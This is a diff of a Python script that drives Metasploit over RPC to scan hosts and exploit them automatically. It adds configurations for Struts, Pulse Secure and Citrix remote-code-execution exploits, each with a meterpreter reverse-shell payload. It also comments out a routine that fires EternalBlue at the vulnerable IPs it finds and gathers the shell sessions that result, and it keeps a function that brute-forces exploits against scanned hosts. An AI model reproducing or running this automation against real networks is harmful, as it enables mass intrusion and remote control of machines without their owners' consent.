@@ -71,6 +71,25 @@ dictionnary_config_exploit = {'windows/smb/ms17_010_eternalblue': {
         'RHOSTS': '',
         'Payload': 'windows/meterpreter/reverse_tcp',
         'LHOST': ''
+    },
+    'multi/http/struts_dmi_rest_exec': {
+        'RHOSTS': '',
+        'RPORT': '',
+        'Payload': 'java/meterpreter/reverse_tcp',
+        'LHOSTS':''
+    },
+    ############################################TOP EXPLOIT 2016-2020 USA############################################
+    'linux/http/pulse_secure_cmd_exec': {
+        'RHOSTS': '',
+        'CheckModule': 'auxiliary/gather/pulse_secure_file_disclosure',
+        'Payload': 'linux/x64/meterpreter_reverse_tcp',
+        'LHOSTS': ''
+    },
+    'linux/http/citrix_dir_traversal_rce': {
+        'RHOSTS': '',
+        'CheckModule': 'auxiliary/scanner/http/citrix_dir_traversal',
+        'Payload': 'python/meterpreter/reverse_tcp',
+        'LHOSTS': ''
     }
 
 }
@@ -171,6 +190,10 @@ dictionnary_config_scanner = {
 
 }
 
+#00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+############################################AUTO SCAN/EXPLOIT PORT PART#################################################
+#00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+
 
 #####################################################AUTO SCAN PART#####################################################
 def script_automate_scan():
@@ -252,7 +275,7 @@ def script_automate_scan():
                         dict_tmp['info'] = dico_scanner['Info']
                     except:
                         a = None
-
+                print(dict_tmp)
                 dict_of_data[port_num] = dict_tmp
                 # RESET DICT TMP
                 dict_tmp = {}
@@ -265,62 +288,64 @@ def script_automate_scan():
 
 
 ###############################################AUTO RUN EXPLOIT PART####################################################
-def script_automate_exploit(data_read_out, client, console):
-    '''
+# def script_automate_exploit(data_read_out, client, console):
+#     '''
+#
+#     @param data_read_out: list data from the metasploit console
+#     @param client: client rpc
+#     @param console: console associated to the client rpc
+#     @return: rpc client with the created sessions for this client
+#     '''
+#     # check opened port
+#     opened_vuln_port, ip_vuln = look_for_port()
+#     ip_vuln_reconf = []
+#
+#     # test with putting an unexploitable
+#
+#     ####################################GET IP HOSTNAME#########################################
+#     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#     s.connect(("8.8.8.8", 80))
+#     hostname = s.getsockname()[0]
+#     s.close()
+#
+#     # extract ip from data_read_outh which is a list of string which mentions possible vulnerable ip
+#     for data in data_read_out:
+#         for ip in ip_vuln:
+#             if ip[0] in data and ip[0] not in ip_vuln_reconf:
+#                 ip_vuln_reconf.append(ip[0])
+#
+#     for str_data in data_read_out:
+#         if 'eternalblue' in str_data:
+#             #######################################CONFIG EXPLOIT####################################
+#             auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
+#             exploit_name = 'windows/smb/ms17_010_eternalblue'
+#
+#             #####################################GET EXPLOIT########################################
+#
+#             exploit = main_run_exploit(exploit_name, client)
+#
+#             #######################################CONFIG OPTIONS AND PAYLOAD#######################
+#
+#             running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR', exploit)
+#
+#             payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
+#             main_config_payload('LHOST', hostname, 'STR', payload)
+#
+#             for ip in ip_vuln_reconf:
+#                 main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
+#                 main_exe_exploit(payload, exploit, client)
+#
+#             print(client.sessions.list)
+#             sessions_created = client.sessions.list
+#             return client, sessions_created
+#
+#     return client, -1
 
-    @param data_read_out: list data from the metasploit console
-    @param client: client rpc
-    @param console: console associated to the client rpc
-    @return: rpc client with the created sessions for this client
-    '''
-    # check opened port
-    opened_vuln_port, ip_vuln = look_for_port()
-    ip_vuln_reconf = []
-
-    # test with putting an unexploitable
-
-    ####################################GET IP HOSTNAME#########################################
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    hostname = s.getsockname()[0]
-    s.close()
-
-    # extract ip from data_read_outh which is a list of string which mentions possible vulnerable ip
-    for data in data_read_out:
-        for ip in ip_vuln:
-            if ip[0] in data and ip[0] not in ip_vuln_reconf:
-                ip_vuln_reconf.append(ip[0])
-
-    for str_data in data_read_out:
-        if 'eternalblue' in str_data:
-            #######################################CONFIG EXPLOIT####################################
-            auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
-            exploit_name = 'windows/smb/ms17_010_eternalblue'
-
-            #####################################GET EXPLOIT########################################
-
-            exploit = main_run_exploit(exploit_name, client)
-
-            #######################################CONFIG OPTIONS AND PAYLOAD#######################
-
-            running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR', exploit)
-
-            payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
-            main_config_payload('LHOST', hostname, 'STR', payload)
-
-            for ip in ip_vuln_reconf:
-                main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
-                main_exe_exploit(payload, exploit, client)
-
-            print(client.sessions.list)
-            sessions_created = client.sessions.list
-            return client, sessions_created
-
-    return client, -1
-
+#00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+###############################################EXPLOIT-DB PART##########################################################
+#00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 
 ###############################################EXPLOIT-DB SEARCH########################################################
-
 def get_board_exploit(client):
     # pdb.set_trace()
     board_of_exploit = {}
@@ -387,6 +412,7 @@ def brute_force_exploit(board_of_exploit, client):
 
 ########################################################TEST PART#######################################################
 # client, console = main_connection()
+# # print(get_board_exploit(client))
 # board = {
 #    "172.16.1.2":{
 #       "445":[
@@ -478,5 +504,5 @@ def brute_force_exploit(board_of_exploit, client):
 # }
 # print(brute_force_exploit(board, client))
 #
-
-print(script_automate_scan())
+#
+# # print(script_automate_scan())
